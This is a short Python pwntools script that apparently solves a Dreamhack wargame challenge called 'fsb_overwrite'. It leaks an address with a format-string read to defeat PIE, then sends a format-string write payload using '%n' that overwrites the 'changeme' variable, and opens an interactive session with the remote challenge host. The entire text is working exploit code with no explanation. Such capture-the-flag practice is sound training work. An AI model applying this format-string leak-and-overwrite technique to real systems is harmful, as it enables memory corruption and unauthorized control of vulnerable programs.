from pwn import *
r = remote('host3.dreamhack.games', 11754)
e = ELF('./fsb_overwrite')

main_offset = e.symbols['main']
changeme_offset = e.symbols['changeme']
r.sendline(b'%15$p')

main_leak = int(r.recvline().strip(), 16)
pie_base = main_leak - main_offset
changeme_addr = pie_base + changeme_offset

fmt = b'%1$1337c%8$n'

payload = fmt.ljust(16, b'A') + p64(changeme_addr)
assert len(payload) <= 0x20

r.sendline(payload)
r.interactive()